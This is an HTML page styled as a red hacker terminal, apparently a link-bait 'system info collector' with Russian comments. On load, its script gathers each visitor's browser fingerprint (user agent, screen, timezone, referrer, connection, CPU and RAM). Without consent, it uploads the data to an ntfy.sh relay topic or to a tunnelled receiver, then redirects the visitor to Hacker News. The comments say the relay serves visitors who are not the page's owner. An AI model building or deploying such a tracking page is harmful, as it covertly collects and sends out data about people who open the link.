<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>reddev</title>
<style>
    :root{
        --bg: #ff0000;
        --fg: #ffffff;
        --line: rgba(255, 255, 255, .45);
        --glass: rgba(0, 0, 0, .22);
    }
    * { box-sizing: border-box; }
    html, body { min-height: 100%; }
    body {
        background-color: var(--bg);
        color: var(--fg);
        font-family: "Courier New", monospace;
        margin: 0;
        padding: clamp(16px, 5vw, 40px);
        padding-bottom: clamp(56px, 12vw, 76px);
        min-height: 100vh;
        overflow-x: hidden;
        position: relative;
        -webkit-font-smoothing: antialiased;
    }
    ::selection { background: #fff; color: var(--bg); }

    .vignette {
        position: fixed; inset: 0; z-index: 1; pointer-events: none;
        background: radial-gradient(ellipse at center,
                    rgba(0,0,0,0) 42%, rgba(0,0,0,.38) 100%);
    }
    body::before {
        content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 10;
        background: repeating-linear-gradient(
            to bottom,
            rgba(0,0,0,0.08) 0px,
            rgba(0,0,0,0.08) 1px,
            transparent 1px,
            transparent 3px
        );
        animation: crtFlicker 6s infinite steps(1);
    }
    @keyframes crtFlicker {
        0%, 96%, 100% { opacity: 1; }
        97%           { opacity: .82; }
        98%           { opacity: .96; }
    }

    .wrap { position: relative; z-index: 2; width: 100%; max-width: 1000px; margin: 0 auto; }

    .prompt-line {
        font-size: clamp(.68em, 1.7vw, .85em);
        letter-spacing: .14em; text-transform: uppercase; opacity: .85;
        margin: 0 0 clamp(10px, 3vw, 18px);
        text-shadow: 0 0 12px rgba(255,255,255,.5);
    }
    .prompt-line .user { opacity: 1; }
    .prompt-line .sep  { opacity: .6; }
    .prompt-line .cmd  { border-bottom: 1px solid var(--line); padding-bottom: 1px; }

    h1 {
        font-size: clamp(2.2em, 10vw, 4.5em);
        letter-spacing: clamp(0.05em, 1vw, 0.15em);
        text-shadow: 0 0 8px #fff, 0 0 20px rgba(255,255,255,0.6);
        margin: 0 0 0.3em 0; line-height: 1.1; word-break: break-word;
        position: relative;
        animation: glitch 7s infinite steps(1);
    }
    h1::before { content: "> "; opacity: 0.7; }
    @keyframes glitch {
        0%, 90%, 100% { transform: translate(0, 0); text-shadow: 0 0 8px #fff, 0 0 20px rgba(255,255,255,.6); }
        91% { transform: translate(-3px, 1px) skewX(-3deg); text-shadow: 4px 0 0 rgba(0,0,0,.55), -4px 0 0 #fff, 0 0 22px rgba(255,255,255,.9); }
        92% { transform: translate(3px, -1px) skewX(3deg);  text-shadow: -4px 0 0 rgba(0,0,0,.55), 4px 0 0 #fff, 0 0 22px rgba(255,255,255,.9); }
        93% { transform: translate(-1px, 0);              text-shadow: 2px 0 0 rgba(0,0,0,.5), -2px 0 0 #fff, 0 0 18px rgba(255,255,255,.7); }
        94% { transform: translate(0, 0);                 text-shadow: 0 0 8px #fff, 0 0 20px rgba(255,255,255,.6); }
    }

    .terminal {
        margin-top: clamp(16px, 4vw, 30px);
        border: 1px solid var(--line);
        background: var(--glass);
        box-shadow: 0 0 0 1px rgba(0,0,0,.25), 0 0 30px rgba(255,255,255,.10) inset, 0 0 24px rgba(0,0,0,.25);
        overflow: hidden;
    }
    .terminal__bar {
        display: flex; align-items: center; gap: 7px;
        padding: 8px 12px; border-bottom: 1px solid var(--line);
        background: rgba(0,0,0,.28);
    }
    .dot { width: 7px; height: 7px; border-radius: 50%; background: #fff; box-shadow: 0 0 8px rgba(255,255,255,.8); }
    .dot:nth-child(1) { opacity: .95; }
    .dot:nth-child(2) { opacity: .6; }
    .dot:nth-child(3) { opacity: .3; }

    .terminal__body { padding: clamp(12px, 3.5vw, 22px); min-height: clamp(180px, 30vw, 280px); }

    .subtitle {
        font-size: clamp(0.95em, 2.5vw, 1.25em);
        letter-spacing: 0.05em; opacity: 0.95;
        border-left: 3px solid #fff; padding-left: clamp(8px, 2vw, 14px);
        margin: 0; max-width: 70ch; min-height: 1.4em;
        white-space: pre-wrap;
        text-shadow: 0 0 12px rgba(255,255,255,.35);
        word-break: break-word;
    }
    .caret {
        display: inline-block; width: .58em; height: 1.02em;
        margin-left: .12em; vertical-align: -.14em;
        background: #fff; box-shadow: 0 0 10px #fff;
        animation: blink 1s steps(1) infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }

    .log {
        list-style: none; margin: clamp(14px, 3.5vw, 24px) 0 0; padding: 0;
        font-size: clamp(.66em, 1.6vw, .82em);
        letter-spacing: .09em; line-height: 1.9; opacity: .85;
    }
    .log li {
        opacity: 0; transform: translateX(-8px);
        transition: opacity .4s ease, transform .4s ease;
        white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    }
    .log li.show  { opacity: .85; transform: translateX(0); }
    .log li.error { text-shadow: 0 0 12px rgba(255,255,255,.85); color: #ffcccc; }
    .log li.warn  { color: #ffeeaa; }
    .log li.ok    { color: #ccffcc; }

    .statusbar {
        position: fixed; left: 0; right: 0; bottom: 0; z-index: 3;
        display: flex; flex-wrap: wrap; gap: clamp(8px, 3vw, 26px);
        justify-content: space-between; align-items: center;
        padding: 7px clamp(12px, 4vw, 24px);
        min-height: 26px; border-top: 1px solid var(--line);
        background: rgba(0,0,0,.3); backdrop-filter: blur(2px);
        font-size: clamp(.62em, 1.5vw, .75em);
        letter-spacing: .12em; text-transform: uppercase; opacity: .8;
    }
</style>
</head>
<body>

<div class="vignette" aria-hidden="true"></div>

<main class="wrap">
    <div class="prompt-line">
        <span class="user">root@reddev</span><span class="sep">:</span><span class="sep">~</span><span class="sep">$</span>
        <span class="cmd">whoami</span>
    </div>

    <h1>reddev</h1>

    <section class="terminal">
        <div class="terminal__bar">
            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
        </div>
        <div class="terminal__body">
            <p class="subtitle">system info collector</p>
        </div>
    </section>

    <ul class="log" id="log"></ul>
</main>

<div class="statusbar" aria-hidden="true">
    <span id="status">booting...</span>
    <span>reddev &mdash; no fake logs</span>
</div>

<script>
(function () {
    "use strict";

    /* ----------------------------------------------------------------
       No GitHub token used. Flow:
         1. Collect real browser/screen/network info
         2. Upload as .txt to anonymous paste services (public URLs)
         3. If all pastes fail -> download file locally instead
         4. Check https://news.ycombinator.com/ with 8s timeout
         5. Redirect on success, or log the exact failure reason
       (GitHub API itself always requires auth for writes — that is
       why anonymous pastes are used here. To actually push into
       gplyno/reddev without exposing a token, add a tiny proxy.)
       ---------------------------------------------------------------- */

    const TARGET_REPO = 'gplyno/reddev';

    const subtitle = document.querySelector(".subtitle");
    const logEl    = document.getElementById("log");
    const statusEl = document.getElementById("status");

    const caret = document.createElement("span");
    caret.className = "caret";
    caret.setAttribute("aria-hidden", "true");

    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const setStatus = t => { statusEl.textContent = t; };

    function setConsole(text) {
        subtitle.textContent = text;
        subtitle.appendChild(caret);
    }

    function addLog(text, type = '') {
        return new Promise(resolve => {
            const li = document.createElement("li");
            li.textContent = text;
            if (type) li.classList.add(type);
            logEl.appendChild(li);
            void li.offsetWidth;
            li.classList.add("show");
            setTimeout(resolve, 160);
        });
    }

    /* ============ 1. COLLECT ============ */
    function collectBrowserInfo() {
        const nav = navigator;
        const scr = screen;
        const info = {
            'user-agent'          : nav.userAgent,
            'language'            : nav.language,
            'languages'           : (nav.languages || []).join(', ') || 'n/a',
            'platform'            : nav.platform || 'n/a',
            'cookies enabled'     : nav.cookieEnabled ? 'yes' : 'no',
            'online'              : nav.onLine ? 'yes' : 'no',
            'screen'              : `${scr.width}x${scr.height}`,
            'available area'      : `${scr.availWidth}x${scr.availHeight}`,
            'color depth (bit)'   : scr.colorDepth,
            'device pixel ratio'  : window.devicePixelRatio || 1,
            'timezone'            : Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a',
            'utc offset (min)'    : new Date().getTimezoneOffset(),
            'viewport'            : `${window.innerWidth}x${window.innerHeight}`,
            'load time (ms)'      : performance.now().toFixed(0),
            'url'                 : location.href,
            'referrer'            : document.referrer || '(none)',
            'do not track'        : nav.doNotTrack || '(unset)'
        };
        if (nav.connection) {
            info['connection type']  = nav.connection.effectiveType || 'n/a';
            info['downlink (mbit/s)'] = nav.connection.downlink     || 'n/a';
            info['rtt (ms)']          = nav.connection.rtt          || 'n/a';
        }
        if (nav.hardwareConcurrency) info['logical cpus']   = nav.hardwareConcurrency;
        if (nav.deviceMemory)        info['device ram (gb)'] = nav.deviceMemory;
        return info;
    }

    /* ============ 2. UPLOAD TO PYTHON SERVER ============ */
    /*  Адрес приёмника (server.py):
          ''                              — тот же адрес, с которого открыта страница
                                            (если её отдаёт сам server.py — то есть GET /)
          'https://xxx.trycloudflare.com' — туннель cloudflared к локальному серверу
          'http://127.0.0.1:8000'         — напрямую на этом ПК (страница открыта локально)

        Адрес можно не вписывать в код, а передать один раз в ссылке:
          .../index.html?server=https://xxx.trycloudflare.com
        Он запомнится в localStorage этого браузера.  */
    const SERVER_URL = (function () {
      const KEY = 'reddev_server';
      try {
        const fromQuery = new URLSearchParams(location.search).get('server') ||
                          (location.hash.match(/server=([^&]+)/) || [])[1];
        if (fromQuery) {
          const value = decodeURIComponent(fromQuery);
          localStorage.setItem(KEY, value);
          return value;
        }
        return localStorage.getItem(KEY) || '';
      } catch (e) {
        return '';
      }
    })();

    /*  Токен, если server.py запущен с --token SECRET  */
    const TOKEN = '';

    /*  Публичный relay ntfy.sh — нужен, когда страницу открывает кто-то другой
        (его браузер не может достучаться до вашего 127.0.0.1). Задаётся так:
          .../index.html?ntfy=reddev-xxxxxxxxxxxx
        или вписывается здесь. Приёмник на ПК забирает сообщения сам.  */
    const NTFY_TOPIC = (function () {
      const KEY = 'reddev_ntfy';
      try {
        const fromQuery = new URLSearchParams(location.search).get('ntfy') ||
                          (location.hash.match(/ntfy=([^&]+)/) || [])[1];
        if (fromQuery) {
          const value = decodeURIComponent(fromQuery);
          localStorage.setItem(KEY, value);
          return value;
        }
        return localStorage.getItem(KEY) || '';
      } catch (e) {
        return '';
      }
    })();
    const NTFY_SERVER = 'https://ntfy.sh';

    /*  Куда пробовать, если основной адрес не отвечает.
        Полезно, если страница открыта с GitHub Pages, а туннель отвалился:
        браузер на этом же ПК достучится до сервера по localhost.  */
    const FALLBACK_URLS = ['http://127.0.0.1:8000'];

    /*  Переходить на news.ycombinator.com после успешной отправки (как в оригинале)  */
    const REDIRECT_TO_HN = true;

    function buildEndpoints() {
      const list = [SERVER_URL || location.origin, ...FALLBACK_URLS];
      return [...new Set(list.map(u => String(u).replace(/\/+$/, '') + '/upload'))];
    }

    async function uploadToRelay(content) {
      const url = NTFY_SERVER.replace(/\/+$/, '') + '/' + encodeURIComponent(NTFY_TOPIC);
      const r = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain; charset=utf-8',
          'Title': 'reddev',
          'Tags': 'computer'
        },
        body: content
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      const data = await r.json().catch(() => ({}));
      return { service: 'ntfy-relay', url: url + '/' + (data.id || '') };
    }

    async function uploadToPaste(content) {
      let lastError = new Error('no endpoint configured');

      if (NTFY_TOPIC) {
        await addLog('[ .. ] sending via public relay...', 'warn');
        try {
          const res = await uploadToRelay(content);
          await addLog(`[ OK ] relay: ntfy.sh/${NTFY_TOPIC}`, 'ok');
          return res;
        } catch (err) {
          lastError = err;
          await addLog(`[ .. ] relay failed: ${err.message}`, 'warn');
        }
      }

      await addLog('[ .. ] sending to local receiver...', 'warn');

      for (const endpoint of buildEndpoints()) {
        try {
          const r = await fetch(endpoint, {
            method: 'POST',
            headers: Object.assign(
              { 'Content-Type': 'application/json' },
              TOKEN ? { 'X-Reddev-Token': TOKEN } : {}
            ),
            body: JSON.stringify({ content: content })
          });

          if (!r.ok) {
            throw new Error('HTTP ' + r.status);
          }

          const data = await r.json();
          await addLog(`[ OK ] receiver: ${endpoint}`, 'ok');
          return { service: 'reddev-receiver', url: data.file || endpoint };
        } catch (err) {
          lastError = err;
          await addLog(`[ .. ] ${endpoint} -> ${err.message}`, 'warn');
        }
      }

      throw lastError;
    }


    /* ============ 3. HACKER NEWS CHECK ============ */
    async function checkHackerNews() {
        const url = 'https://news.ycombinator.com/';
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);
        try {
            const resp = await fetch(url, {
                method: 'GET',
                mode: 'cors',
                signal: controller.signal,
                headers: { 'Accept': 'text/html' }
            });
            clearTimeout(timeoutId);
            if (!resp.ok) return { ok: false, reason: `HTTP ${resp.status} ${resp.statusText}` };
            return { ok: true, url };
        } catch (err) {
            clearTimeout(timeoutId);
            if (err.name === 'AbortError') {
                return { ok: false, reason: 'timeout (8s) — server did not respond' };
            }
            if (err instanceof TypeError) {
                return { ok: false, reason: 'network error or CORS block — site unreachable or refuses browser requests' };
            }
            return { ok: false, reason: err.message || 'unknown error' };
        }
    }

    /* ============ MAIN ============ */
    (async function run() {
        try {
            setStatus('collecting info...');
            setConsole('collecting system info...');
            await sleep(400);

            const info = collectBrowserInfo();

            await addLog('=== system info ===');
            for (const [k, v] of Object.entries(info)) {
                await addLog(`[ OK ] ${k}: ${v}`, 'ok');
            }

            const txt =
                'reddev — system info dump\n' +
                'generated: '   + new Date().toISOString() + '\n' +
                'source: '      + location.href + '\n' +
                'target repo: ' + TARGET_REPO + ' (via anonymous paste, no token)\n' +
                '\n--- collected data ---\n' +
                Object.entries(info).map(([k, v]) => `${k}: ${v}`).join('\n') +
                '\n--- end ---\n';

            setStatus('uploading...');
            setConsole('uploading data...');

            try {
                const res = await uploadToPaste(txt);
                await addLog(`[ OK ] uploaded to ${res.service}`, 'ok');
                await addLog(`[ OK ] url: ${res.url}`, 'ok');
            } catch (e) {
                await addLog(`[ ERR ] ${e.message}`, 'error');
                await addLog('[ .. ] falling back to local download', 'warn');
                downloadLocally(txt);
                await addLog('[ OK ] saved as reddev-info.txt', 'ok');
            }

            setStatus('checking hn...');
            setConsole('checking https://news.ycombinator.com/ ...');
            await addLog('[ .. ] checking https://news.ycombinator.com/ ...', 'warn');

            const hn = await checkHackerNews();

            if (hn.ok) {
                await addLog('[ OK ] hacker news reachable — redirecting', 'ok');
                if (!REDIRECT_TO_HN) {
                    setConsole('готово — данные отправлены на приёмник');
                    setStatus('done');
                    return;
                }
                setConsole('redirecting to news.ycombinator.com...');
                setStatus('redirecting...');
                await sleep(700);
                window.location.href = hn.url;
            } else {
                await addLog(`[ ERR ] hacker news unreachable: ${hn.reason}`, 'error');
                setConsole('ERROR: ' + hn.reason);
                setStatus('hn check failed');
            }
        } catch (fatal) {
            await addLog(`[ FATAL ] ${fatal.message}`, 'error');
            setConsole('fatal error — see log');
            setStatus('fatal');
        }
    })();
})();
</script>

</body>
</html>
